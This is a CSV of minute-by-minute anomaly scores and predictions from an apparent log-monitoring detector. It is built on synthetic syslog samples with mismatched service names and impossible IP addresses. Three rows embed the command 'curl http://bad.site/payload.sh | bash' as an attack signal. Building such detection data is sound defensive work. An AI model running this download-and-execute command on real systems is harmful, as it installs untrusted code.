bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 13:33:00,0.9999998741897987,1,1,0.8224995273096307,3,62,systemd: Finished Daily apt download activities. || redis-server: Listening on LVM2 poll daemon socket. || ntpd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || logrotate: Rotating log files. || CRON: Synced RTC time from system clock. ||
2026-07-01 13:34:00,0.9999998577169011,1,1,0.8224995273096307,3,55,systemd-timesyncd: Started Session c80 of user root. || sudo: Accepted publickey for user from 10.0.0.129 port 22 ssh2. || sshd: Rotating log files. || redis-server: Rotating log files. || unattended-upgrades: Finished Daily apt download activities. 
2026-07-01 13:35:00,0.9999943992067689,1,1,0.8224995273096307,3,63,unix_chkpwd: Synced RTC time from system clock. || sudo: Finished Daily apt download activities. || NetworkManager: Failed password for invalid user test from 192.168.1.28355 port 22 ssh2 || CRON: Accepted publickey for user from 10.0.0.231 port 22 s
2026-07-01 13:36:00,0.9999923782314222,1,1,0.8224995273096307,3,63,dockerd: Started Cleanup of Temporary Directories. || dockerd: Started Cleanup of Temporary Directories. || telnetd: Finished Daily apt download activities. || chronyd: Accepted publickey for user from 10.0.0.167 port 22 ssh2. || rsyslogd: Started Se
2026-07-01 13:37:00,0.9999137315812311,1,1,0.8224995273096307,3,61,kernel: Accepted publickey for user from 10.0.0.152 port 22 ssh2. || logrotate: Started Cleanup of Temporary Directories. || smartd: Accepted publickey for user from 10.0.0.246 port 22 ssh2. || redis-server: Rotating log files. || redis-server: Synce
2026-07-01 13:38:00,0.9114119388510703,1,1,0.8224995273096307,3,58,CRON: Accepted publickey for user from 10.0.0.110 port 22 ssh2. || ftpd: Started Cleanup of Temporary Directories. || unattended-upgrades: Accepted publickey for user from 10.0.0.137 port 22 ssh2. || named: Started Cleanup of Temporary Directories. |
2026-07-01 13:39:00,0.9685749423177583,1,1,0.8224995273096307,3,61,systemd-timesyncd: Started Cleanup of Temporary Directories. || rsyslogd: Started CUPS Scheduler. || ufw: Synced RTC time from system clock. || dockerd: Started Session c195 of user root. || chronyd: Accepted publickey for user from 10.0.0.55 port 22
2026-07-01 13:40:00,0.9999560807013727,1,1,0.8224995273096307,3,66,rsyslogd: Listening on LVM2 poll daemon socket. || gpm: Rotating log files. || gpm: Started Session c198 of user root. || systemd: Finished Daily apt download activities. || sshd: Accepted publickey for user from 10.0.0.84 port 22 ssh2. || ufw: Synce
2026-07-01 13:41:00,0.999990019603273,1,1,0.8224995273096307,3,61,systemd-timesyncd: Accepted publickey for user from 10.0.0.50 port 22 ssh2. || unix_chkpwd: Started CUPS Scheduler. || named: Accepted publickey for user from 10.0.0.93 port 22 ssh2. || xinetd: Accepted publickey for user from 10.0.0.5 port 22 ssh2. 
2026-07-01 13:42:00,0.999801628981349,1,1,0.8224995273096307,3,61,NetworkManager: Listening on LVM2 poll daemon socket. || smartd: Started CUPS Scheduler. || ntpd: Started CUPS Scheduler. || ufw: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.20436 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || logrotate: Accepted publi
2026-07-01 13:43:00,0.9999947243559292,1,1,0.8224995273096307,3,58,docker: Rotating log files. || NetworkManager: Listening on LVM2 poll daemon socket. || ufw: Started Cleanup of Temporary Directories. || ufw: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || chronyd: Accepted public
2026-07-01 13:44:00,0.9999982998196222,1,1,0.8224995273096307,3,58,redis-server: Started Session c73 of user root. || cups: Listening on LVM2 poll daemon socket. || smartd: Synced RTC time from system clock. || ftpd: Finished Daily apt download activities. || xinetd: Accepted publickey for user from 10.0.0.93 port 2
2026-07-01 13:45:00,0.9999976738370446,1,1,0.8224995273096307,3,62,systemd-timesyncd: Synced RTC time from system clock. || named: Finished Daily apt download activities. || named: Finished Daily apt download activities. || gpm: Failed password for invalid user test from 192.168.1.22938 port 22 ssh2 || systemd-times
2026-07-01 13:46:00,0.9999948509177197,1,1,0.8224995273096307,3,58,xinetd: Synced RTC time from system clock. || systemd: Listening on LVM2 poll daemon socket. || rsyslogd: Started Cleanup of Temporary Directories. || sshd: Rotating log files. || unix_chkpwd: Started Cleanup of Temporary Directories. || dockerd: Sta
2026-07-01 13:47:00,0.9999999685511672,1,1,0.8224995273096307,3,63,systemd-timesyncd: Finished Daily apt download activities. || dockerd: Accepted publickey for user from 10.0.0.178 port 22 ssh2. || xinetd: Started CUPS Scheduler. || CRON: Rotating log files. || kernel: Synced RTC time from system clock. || docker: 
2026-07-01 13:48:00,0.9999999618699303,1,1,0.8224995273096307,3,62,chronyd: Started Cleanup of Temporary Directories. || dockerd: Accepted publickey for user from 10.0.0.86 port 22 ssh2. || logrotate: Started CUPS Scheduler. || xinetd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Synced RTC time from 
2026-07-01 13:49:00,0.9999977277329746,1,1,0.8224995273096307,3,59,CRON: Accepted publickey for user from 10.0.0.91 port 22 ssh2. || kernel: kernel: Kernel panic - not syncing: Fatal exception || sudo: Accepted publickey for user from 10.0.0.34 port 22 ssh2. || ftpd: Started CUPS Scheduler. || docker: Started Cleanu
2026-07-01 13:50:00,0.9999997464369862,1,1,0.8224995273096307,3,57,ftpd: Synced RTC time from system clock. || gpm: Listening on LVM2 poll daemon socket. || unattended-upgrades: Accepted publickey for user from 10.0.0.186 port 22 ssh2. || smartd: Finished Daily apt download activities. || xinetd: Listening on LVM2 p
2026-07-01 13:51:00,0.9999999872253206,1,1,0.8224995273096307,3,59,redis-server: Synced RTC time from system clock. || ntpd: Accepted publickey for user from 10.0.0.133 port 22 ssh2. || NetworkManager: Started Session c225 of user root. || ufw: Finished Daily apt download activities. || ntpd: Listening on LVM2 poll 
2026-07-01 13:52:00,0.9999999542502288,1,1,0.8224995273096307,3,60,dockerd: Started CUPS Scheduler. || rsyslogd: Rotating log files. || xinetd: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon socket. || ufw: Rotating log files. || smartd: Finished Daily apt download activities. || t
2026-07-01 13:53:00,0.9999998545700423,1,1,0.8224995273096307,3,60,kernel: Accepted publickey for user from 10.0.0.180 port 22 ssh2. || xinetd: Listening on LVM2 poll daemon socket. || CRON: Accepted publickey for user from 10.0.0.65 port 22 ssh2. || rsyslogd: Synced RTC time from system clock. || kernel: Synced RTC
2026-07-01 13:54:00,0.9999999350513362,1,1,0.8224995273096307,3,62,dockerd: Rotating log files. || gpm: Rotating log files. || systemd: Started CUPS Scheduler. || cups: Started Cleanup of Temporary Directories. || unix_chkpwd: Started Session c139 of user root. || xinetd: Started Cleanup of Temporary Directories. ||
2026-07-01 13:55:00,0.9999914552551606,1,1,0.8224995273096307,3,59,dockerd: Synced RTC time from system clock. || telnetd: Listening on LVM2 poll daemon socket. || sshd: Accepted publickey for user from 10.0.0.101 port 22 ssh2. || CRON: Accepted publickey for user from 10.0.0.116 port 22 ssh2. || kernel: Listening o
2026-07-01 13:56:00,0.9999528506359693,1,1,0.8224995273096307,3,59,rsyslogd: Rotating log files. || docker: Started CUPS Scheduler. || dockerd: Synced RTC time from system clock. || chronyd: Started Session c166 of user root. || telnetd: Listening on LVM2 poll daemon socket. || ufw: Started CUPS Scheduler. || rsyslo
2026-07-01 13:57:00,0.999755978892167,1,1,0.8224995273096307,3,60,chronyd: Started CUPS Scheduler. || unix_chkpwd: Started Cleanup of Temporary Directories. || ftpd: Accepted publickey for user from 10.0.0.153 port 22 ssh2. || redis-server: Listening on LVM2 poll daemon socket. || ftpd: Accepted publickey for user 
2026-07-01 13:58:00,0.9948074398379257,1,1,0.8224995273096307,3,59,systemd: Listening on LVM2 poll daemon socket. || xinetd: Listening on LVM2 poll daemon socket. || smartd: Finished Daily apt download activities. || cups: Rotating log files. || telnetd: Rotating log files. || sshd: Started CUPS Scheduler. || Networ
2026-07-01 13:59:00,0.9989902137671544,1,1,0.8224995273096307,3,56,NetworkManager: Accepted publickey for user from 10.0.0.192 port 22 ssh2. || dockerd: Started Cleanup of Temporary Directories. || xinetd: Listening on LVM2 poll daemon socket. || ftpd: Started Cleanup of Temporary Directories. || redis-server: Synce
2026-07-01 14:00:00,0.9999749365221509,1,1,0.8224995273096307,3,58,cups: kernel: Kernel panic - not syncing: Fatal exception || ftpd: Listening on LVM2 poll daemon socket. || gpm: Rotating log files. || ntpd: Finished Daily apt download activities. || ftpd: Synced RTC time from system clock. || named: Synced RTC tim
2026-07-01 14:01:00,0.9999895549494321,1,1,0.8224995273096307,3,62,dockerd: Listening on LVM2 poll daemon socket. || smartd: Accepted publickey for user from 10.0.0.54 port 22 ssh2. || sudo: Started Session c99 of user root. || xinetd: Listening on LVM2 poll daemon socket. || kernel: Finished Daily apt download acti
2026-07-01 14:02:00,0.9996278764999096,1,1,0.8224995273096307,3,62,NetworkManager: Started Session c108 of user root. || rsyslogd: Started CUPS Scheduler. || ftpd: Synced RTC time from system clock. || systemd: Accepted publickey for user from 10.0.0.5 port 22 ssh2. || sshd: Synced RTC time from system clock. || cup
2026-07-01 14:03:00,0.9986987503562795,1,1,0.8224995273096307,3,60,chronyd: Rotating log files. || NetworkManager: Rotating log files. || unattended-upgrades: Started CUPS Scheduler. || named: Synced RTC time from system clock. || docker: Started Cleanup of Temporary Directories. || docker: Rotating log files. || sy
2026-07-01 14:04:00,0.9989668314141803,1,1,0.8224995273096307,3,64,ntpd: Accepted publickey for user from 10.0.0.217 port 22 ssh2. || CRON: Finished Daily apt download activities. || kernel: Rotating log files. || xinetd: Accepted publickey for user from 10.0.0.107 port 22 ssh2. || gpm: Started CUPS Scheduler. || CR
2026-07-01 14:05:00,0.9999963780144869,1,1,0.8224995273096307,3,62,ftpd: Rotating log files. || named: Accepted publickey for user from 10.0.0.39 port 22 ssh2. || sshd: Synced RTC time from system clock. || unattended-upgrades: Finished Daily apt download activities. || gpm: Synced RTC time from system clock. || uni
2026-07-01 14:06:00,0.9999987827353256,1,1,0.8224995273096307,3,61,cups: Started CUPS Scheduler. || xinetd: Listening on LVM2 poll daemon socket. || cups: Started Session c27 of user root. || ufw: Started Session c75 of user root. || systemd-timesyncd: Finished Daily apt download activities. || dockerd: Listening on
2026-07-01 14:07:00,0.9990392398701429,1,1,0.8224995273096307,3,58,ftpd: Accepted publickey for user from 10.0.0.221 port 22 ssh2. || docker: Started Cleanup of Temporary Directories. || NetworkManager: Synced RTC time from system clock. || unix_chkpwd: Started Cleanup of Temporary Directories. || CRON: Synced RTC t
2026-07-01 14:08:00,0.9968404765258077,1,1,0.8224995273096307,3,58,cups: Accepted publickey for user from 10.0.0.23 port 22 ssh2. || redis-server: Started Cleanup of Temporary Directories. || gpm: Listening on LVM2 poll daemon socket. || docker: Synced RTC time from system clock. || logrotate: Listening on LVM2 poll
2026-07-01 14:09:00,0.9999164090324376,1,1,0.8224995273096307,3,56,CRON: Finished Daily apt download activities. || ntpd: Finished Daily apt download activities. || named: kernel: Out of memory: Kill process 29467 (python3) score 987 or sacrifice child || sudo: Accepted publickey for user from 10.0.0.249 port 22 ssh
2026-07-01 14:10:00,0.9999821724106202,1,1,0.8224995273096307,3,63,ufw: Started CUPS Scheduler. || dockerd: Accepted publickey for user from 10.0.0.38 port 22 ssh2. || redis-server: Listening on LVM2 poll daemon socket. || named: Accepted publickey for user from 10.0.0.165 port 22 ssh2. || sshd: Started Cleanup of T
2026-07-01 14:11:00,0.9958911101177044,1,1,0.8224995273096307,3,59,rsyslogd: Started Session c45 of user root. || sshd: Started Cleanup of Temporary Directories. || named: Started CUPS Scheduler. || named: Listening on LVM2 poll daemon socket. || ufw: Finished Daily apt download activities. || CRON: Started Session 
2026-07-01 14:12:00,0.9989034452176072,1,1,0.8224995273096307,3,63,CRON: Started Session c214 of user root. || gpm: Listening on LVM2 poll daemon socket. || dockerd: Synced RTC time from system clock. || docker: Started Cleanup of Temporary Directories. || ufw: Finished Daily apt download activities. || chronyd: Acc
2026-07-01 14:13:00,0.9999107975365051,1,1,0.8224995273096307,3,60,named: Listening on LVM2 poll daemon socket. || sshd: Started Cleanup of Temporary Directories. || xinetd: Rotating log files. || redis-server: kernel: Kernel panic - not syncing: Fatal exception || docker: Finished Daily apt download activities. || 
2026-07-01 14:14:00,0.9996808542490259,1,1,0.8224995273096307,3,60,unix_chkpwd: Accepted publickey for user from 10.0.0.20 port 22 ssh2. || sshd: Listening on LVM2 poll daemon socket. || gpm: Synced RTC time from system clock. || dockerd: Started Session c58 of user root. || named: Accepted publickey for user from 1
2026-07-01 14:15:00,0.9989199934899478,1,1,0.8224995273096307,3,59,ufw: Listening on LVM2 poll daemon socket. || gpm: Rotating log files. || ufw: Listening on LVM2 poll daemon socket. || redis-server: Started Cleanup of Temporary Directories. || ftpd: kernel: Out of memory: Kill process 57646 (python3) score 987 or 
2026-07-01 14:16:00,0.9984048783958035,1,1,0.8224995273096307,3,59,smartd: Listening on LVM2 poll daemon socket. || ftpd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Started Cleanup of Temporary Directories. || dockerd: Started Session c183 of user root. || smartd: Started Session c40 of user root.
2026-07-01 14:17:00,0.9999940587436077,1,1,0.8224995273096307,3,56,ufw: Started Cleanup of Temporary Directories. || ftpd: kernel: Kernel panic - not syncing: Fatal exception || ftpd: Rotating log files. || CRON: kernel: Out of memory: Kill process 39501 (python3) score 987 or sacrifice child || NetworkManager: List
2026-07-01 14:18:00,0.9997055019402507,1,1,0.8224995273096307,3,63,kernel: Synced RTC time from system clock. || smartd: Started Session c80 of user root. || chronyd: Accepted publickey for user from 10.0.0.150 port 22 ssh2. || systemd: Rotating log files. || redis-server: Started CUPS Scheduler. || NetworkManager: 
2026-07-01 14:19:00,0.9614033711602042,1,1,0.8224995273096307,3,58,dockerd: Finished Daily apt download activities. || xinetd: Synced RTC time from system clock. || systemd-timesyncd: Started CUPS Scheduler. || telnetd: Started Session c102 of user root. || telnetd: Started CUPS Scheduler. || CRON: Accepted publicke
2026-07-01 14:20:00,0.8715919973068984,1,1,0.8224995273096307,3,60,docker: bash: -c: line 1: curl http://bad.site/payload.sh | bash || named: Accepted publickey for user from 10.0.0.107 port 22 ssh2. || ftpd: Rotating log files. || rsyslogd: Started CUPS Scheduler. || telnetd: Finished Daily apt download activities.
2026-07-01 14:21:00,0.9928698567933527,1,1,0.8224995273096307,3,57,ntpd: Accepted publickey for user from 10.0.0.75 port 22 ssh2. || ftpd: Accepted publickey for user from 10.0.0.119 port 22 ssh2. || rsyslogd: Started Session c141 of user root. || ufw: Finished Daily apt download activities. || chronyd: Listening on
2026-07-01 14:22:00,0.9981289278846687,1,1,0.8224995273096307,3,58,systemd-timesyncd: Listening on LVM2 poll daemon socket. || telnetd: Started Cleanup of Temporary Directories. || logrotate: Listening on LVM2 poll daemon socket. || chronyd: Started Session c110 of user root. || redis-server: Accepted publickey for 
2026-07-01 14:23:00,0.9947177601310171,1,1,0.8224995273096307,3,60,smartd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || redis-server: Started Cleanup of Temporary Directories. || rsyslogd: Rotating log files. || telnetd: Synced RTC time from system clock. || unix_chkpwd: 
2026-07-01 14:24:00,0.9992211189704555,1,1,0.8224995273096307,3,59,sshd: Listening on LVM2 poll daemon socket. || smartd: kernel: Out of memory: Kill process 51856 (python3) score 987 or sacrifice child || NetworkManager: Synced RTC time from system clock. || xinetd: Finished Daily apt download activities. || docker
2026-07-01 14:25:00,0.9922519842004687,1,1,0.8224995273096307,3,57,telnetd: kernel: Kernel panic - not syncing: Fatal exception || systemd-timesyncd: Started CUPS Scheduler. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || logrotate: Rotating log files. || ntpd: Accepted publickey for user from 10.0.0.
2026-07-01 14:26:00,0.9861987708863003,1,1,0.8224995273096307,3,60,unix_chkpwd: Rotating log files. || chronyd: Started CUPS Scheduler. || telnetd: Finished Daily apt download activities. || unattended-upgrades: Rotating log files. || CRON: Started Cleanup of Temporary Directories. || systemd-timesyncd: Started Clea
2026-07-01 14:27:00,0.9841506516068763,1,1,0.8224995273096307,3,63,redis-server: Started Cleanup of Temporary Directories. || cups: Started CUPS Scheduler. || sudo: kernel: Kernel panic - not syncing: Fatal exception || sshd: Listening on LVM2 poll daemon socket. || ntpd: Synced RTC time from system clock. || Networ
2026-07-01 14:28:00,0.9998833550142477,1,1,0.8224995273096307,3,57,smartd: Synced RTC time from system clock. || sshd: kernel: Out of memory: Kill process 39452 (python3) score 987 or sacrifice child || unix_chkpwd: Accepted publickey for user from 10.0.0.162 port 22 ssh2. || ftpd: Started Session c206 of user root.
2026-07-01 14:29:00,0.9999493216744579,1,1,0.8224995273096307,3,60,kernel: Started Session c64 of user root. || logrotate: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || named: Failed password for invalid user test from 192.168.1.27987 port 22 ssh2 || named: Started Session
2026-07-01 14:30:00,0.9985637951670739,1,1,0.8224995273096307,3,64,ufw: Synced RTC time from system clock. || NetworkManager: Started Cleanup of Temporary Directories. || docker: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.5643 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || xinetd: Accepted publickey for user from 10.
2026-07-01 14:31:00,0.9999440311796387,1,1,0.8224995273096307,3,59,unix_chkpwd: kernel: Kernel panic - not syncing: Fatal exception || smartd: Synced RTC time from system clock. || docker: Started Session c46 of user root. || docker: Accepted publickey for user from 10.0.0.127 port 22 ssh2. || xinetd: Synced RTC tim
2026-07-01 14:32:00,0.9999397021051443,1,1,0.8224995273096307,3,59,gpm: Listening on LVM2 poll daemon socket. || CRON: Started Session c38 of user root. || kernel: Rotating log files. || kernel: Started CUPS Scheduler. || named: Synced RTC time from system clock. || named: Accepted publickey for user from 10.0.0.106
2026-07-01 14:33:00,0.9999903396078395,1,1,0.8224995273096307,3,59,rsyslogd: Finished Daily apt download activities. || ntpd: Synced RTC time from system clock. || ufw: Started Session c213 of user root. || docker: Started Session c69 of user root. || docker: Synced RTC time from system clock. || sudo: Started Clean
2026-07-01 14:34:00,0.9999989868584449,1,1,0.8224995273096307,3,58,logrotate: Listening on LVM2 poll daemon socket. || ftpd: Started Session c108 of user root. || ufw: Synced RTC time from system clock. || ftpd: Started Session c227 of user root. || CRON: Started Session c107 of user root. || xinetd: Synced RTC time
2026-07-01 14:35:00,0.9999995838065261,1,1,0.8224995273096307,3,59,NetworkManager: Synced RTC time from system clock. || smartd: Rotating log files. || ufw: Finished Daily apt download activities. || ntpd: Synced RTC time from system clock. || logrotate: Listening on LVM2 poll daemon socket. || chronyd: Finished Dai
2026-07-01 14:36:00,0.9999998853429821,1,1,0.8224995273096307,3,59,sudo: Started Session c67 of user root. || ftpd: Started Cleanup of Temporary Directories. || logrotate: Finished Daily apt download activities. || ftpd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || kernel: Synced RTC time from system 
2026-07-01 14:37:00,0.9999991143372441,1,1,0.8224995273096307,3,62,named: Rotating log files. || xinetd: Rotating log files. || gpm: Started Session c86 of user root. || gpm: Finished Daily apt download activities. || named: Synced RTC time from system clock. || unattended-upgrades: Started Session c108 of user root
2026-07-01 14:38:00,0.9992719819744781,1,1,0.8224995273096307,3,62,unattended-upgrades: Listening on LVM2 poll daemon socket. || ntpd: Listening on LVM2 poll daemon socket. || ufw: Started CUPS Scheduler. || unattended-upgrades: Finished Daily apt download activities. || docker: Started Cleanup of Temporary Director
2026-07-01 14:39:00,0.9993656853697584,1,1,0.8224995273096307,3,60,systemd: Rotating log files. || ntpd: Started Session c84 of user root. || gpm: Started Session c2 of user root. || sudo: Rotating log files. || docker: Finished Daily apt download activities. || docker: Started Session c83 of user root. || xinetd: S
2026-07-01 14:40:00,0.9998825513323548,1,1,0.8224995273096307,3,61,xinetd: Accepted publickey for user from 10.0.0.223 port 22 ssh2. || sshd: Started Session c38 of user root. || named: Accepted publickey for user from 10.0.0.157 port 22 ssh2. || cups: Finished Daily apt download activities. || cups: Started CUPS Sc
2026-07-01 14:41:00,0.9999923184325644,1,1,0.8224995273096307,3,60,NetworkManager: Started CUPS Scheduler. || sshd: Started CUPS Scheduler. || sudo: Rotating log files. || sudo: Rotating log files. || ntpd: Finished Daily apt download activities. || sshd: Started Session c7 of user root. || systemd: Started Session 
2026-07-01 14:42:00,0.9999999801975628,1,1,0.8224995273096307,3,63,telnetd: Started Session c106 of user root. || xinetd: Listening on LVM2 poll daemon socket. || gpm: Finished Daily apt download activities. || systemd: Rotating log files. || sudo: Accepted publickey for user from 10.0.0.99 port 22 ssh2. || systemd-
2026-07-01 14:43:00,0.9999998536398306,1,1,0.8224995273096307,3,61,ntpd: Started Cleanup of Temporary Directories. || NetworkManager: Synced RTC time from system clock. || systemd-timesyncd: Synced RTC time from system clock. || NetworkManager: Listening on LVM2 poll daemon socket. || rsyslogd: Rotating log files. |
2026-07-01 14:44:00,0.9999912672737572,1,1,0.8224995273096307,3,63,CRON: Started Cleanup of Temporary Directories. || unix_chkpwd: Synced RTC time from system clock. || named: Started Session c45 of user root. || unix_chkpwd: Synced RTC time from system clock. || rsyslogd: Finished Daily apt download activities. || 
2026-07-01 14:45:00,0.9999570153528698,1,1,0.8224995273096307,3,60,xinetd: Started CUPS Scheduler. || ntpd: Started Session c63 of user root. || dockerd: Accepted publickey for user from 10.0.0.107 port 22 ssh2. || sshd: Rotating log files. || cups: Started Cleanup of Temporary Directories. || telnetd: Accepted publ
2026-07-01 14:46:00,0.9999937938503987,1,1,0.8224995273096307,3,62,gpm: Listening on LVM2 poll daemon socket. || cups: Synced RTC time from system clock. || kernel: Started CUPS Scheduler. || named: Started CUPS Scheduler. || smartd: Started Session c220 of user root. || sshd: Started CUPS Scheduler. || kernel: Star
2026-07-01 14:47:00,0.999532523893341,1,1,0.8224995273096307,3,59,gpm: Synced RTC time from system clock. || unattended-upgrades: Accepted publickey for user from 10.0.0.223 port 22 ssh2. || unix_chkpwd: Started CUPS Scheduler. || cups: Started Cleanup of Temporary Directories. || smartd: Rotating log files. || uni
2026-07-01 14:48:00,0.9951979102521017,1,1,0.8224995273096307,3,60,unix_chkpwd: Started CUPS Scheduler. || ftpd: Started CUPS Scheduler. || sudo: Started Session c151 of user root. || ftpd: Rotating log files. || ftpd: Rotating log files. || NetworkManager: Started CUPS Scheduler. || ntpd: Rotating log files. || sma
2026-07-01 14:49:00,0.9995267388193997,1,1,0.8224995273096307,3,61,dockerd: Started Cleanup of Temporary Directories. || dockerd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started CUPS Scheduler. || rsyslogd: Started CUPS Scheduler. || chronyd: Finished Daily apt download activities. || dockerd: Failed p
2026-07-01 14:50:00,0.999791370612242,1,1,0.8224995273096307,3,60,ufw: Started Cleanup of Temporary Directories. || ntpd: Synced RTC time from system clock. || cups: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || unattended-upgrades: Rotating log files. || unix_chkpwd: Acc
2026-07-01 14:51:00,0.9998842353802485,1,1,0.8224995273096307,3,59,systemd-timesyncd: Started CUPS Scheduler. || cups: Accepted publickey for user from 10.0.0.198 port 22 ssh2. || docker: Synced RTC time from system clock. || cups: Started Session c224 of user root. || smartd: Started Session c40 of user root. || CR
2026-07-01 14:52:00,0.9749154763325055,1,1,0.8224995273096307,3,60,ntpd: Listening on LVM2 poll daemon socket. || ntpd: Started Session c155 of user root. || dockerd: Started Session c221 of user root. || telnetd: Synced RTC time from system clock. || ntpd: Finished Daily apt download activities. || ufw: Accepted pu
2026-07-01 14:53:00,0.997060257960984,1,1,0.8224995273096307,3,61,ntpd: Started CUPS Scheduler. || xinetd: Listening on LVM2 poll daemon socket. || CRON: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || kernel: Started Session c232 of user root. || named: Started CUPS Schedu
2026-07-01 14:54:00,0.9932415101383231,1,1,0.8224995273096307,3,56,unix_chkpwd: Synced RTC time from system clock. || xinetd: Finished Daily apt download activities. || ntpd: Started Cleanup of Temporary Directories. || logrotate: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.38818 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 T
2026-07-01 14:55:00,0.9970147713714751,1,1,0.8224995273096307,3,61,unix_chkpwd: Synced RTC time from system clock. || dockerd: Rotating log files. || systemd: Started CUPS Scheduler. || xinetd: Started CUPS Scheduler. || unix_chkpwd: Started Session c231 of user root. || CRON: Started Session c7 of user root. || ufw
2026-07-01 14:56:00,0.9996797328944151,1,1,0.8224995273096307,3,60,kernel: Accepted publickey for user from 10.0.0.62 port 22 ssh2. || logrotate: Started Session c157 of user root. || chronyd: Accepted publickey for user from 10.0.0.150 port 22 ssh2. || CRON: Started Session c103 of user root. || logrotate: Finished
2026-07-01 14:57:00,0.9992627605377962,1,1,0.8224995273096307,3,57,rsyslogd: Accepted publickey for user from 10.0.0.109 port 22 ssh2. || kernel: Started Session c233 of user root. || smartd: Rotating log files. || chronyd: Synced RTC time from system clock. || unix_chkpwd: Finished Daily apt download activities. ||
2026-07-01 14:58:00,0.9996502612367817,1,1,0.8224995273096307,3,62,unix_chkpwd: Rotating log files. || ntpd: Started Cleanup of Temporary Directories. || dockerd: Started Cleanup of Temporary Directories. || ftpd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Finished Daily apt download activities. || redis-
2026-07-01 14:59:00,0.9997544215898084,1,1,0.8224995273096307,3,58,redis-server: Started CUPS Scheduler. || ntpd: Started CUPS Scheduler. || dockerd: Rotating log files. || cups: Synced RTC time from system clock. || chronyd: Accepted publickey for user from 10.0.0.225 port 22 ssh2. || ufw: Started Session c210 of u
2026-07-01 15:00:00,0.9999627793347575,1,1,0.8224995273096307,3,59,NetworkManager: Finished Daily apt download activities. || ufw: Started Cleanup of Temporary Directories. || docker: Started Cleanup of Temporary Directories. || rsyslogd: Started CUPS Scheduler. || named: Started CUPS Scheduler. || gpm: Synced RTC t
2026-07-01 15:01:00,0.9997261407366884,1,1,0.8224995273096307,3,59,ftpd: Started Session c239 of user root. || systemd: Started Session c142 of user root. || chronyd: Accepted publickey for user from 10.0.0.209 port 22 ssh2. || unix_chkpwd: Synced RTC time from system clock. || ntpd: Started Cleanup of Temporary Dir
2026-07-01 15:02:00,0.9994063552377853,1,1,0.8224995273096307,3,61,sudo: Synced RTC time from system clock. || ntpd: Accepted publickey for user from 10.0.0.8 port 22 ssh2. || unattended-upgrades: Started CUPS Scheduler. || logrotate: Started Session c63 of user root. || xinetd: Started CUPS Scheduler. || docker: St
2026-07-01 15:03:00,0.9996347430138426,1,1,0.8224995273096307,3,60,smartd: Started CUPS Scheduler. || gpm: Started Session c76 of user root. || docker: Finished Daily apt download activities. || sudo: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started Cleanup of Temporary Directories. || dockerd: Synced R
2026-07-01 15:04:00,0.999984115084376,1,1,0.8224995273096307,3,61,sshd: Started Session c203 of user root. || docker: Accepted publickey for user from 10.0.0.253 port 22 ssh2. || unix_chkpwd: Finished Daily apt download activities. || systemd-timesyncd: Started Cleanup of Temporary Directories. || CRON: Started CUP
2026-07-01 15:05:00,0.9999082077667362,1,1,0.8224995273096307,3,58,smartd: Accepted publickey for user from 10.0.0.41 port 22 ssh2. || telnetd: Started Session c18 of user root. || named: Rotating log files. || rsyslogd: Listening on LVM2 poll daemon socket. || CRON: Failed password for invalid user test from 192.16
2026-07-01 15:06:00,0.9984384886414007,1,1,0.8224995273096307,3,59,kernel: Finished Daily apt download activities. || redis-server: Rotating log files. || smartd: Rotating log files. || sudo: Started Cleanup of Temporary Directories. || systemd-timesyncd: Started CUPS Scheduler. || docker: Synced RTC time from syste
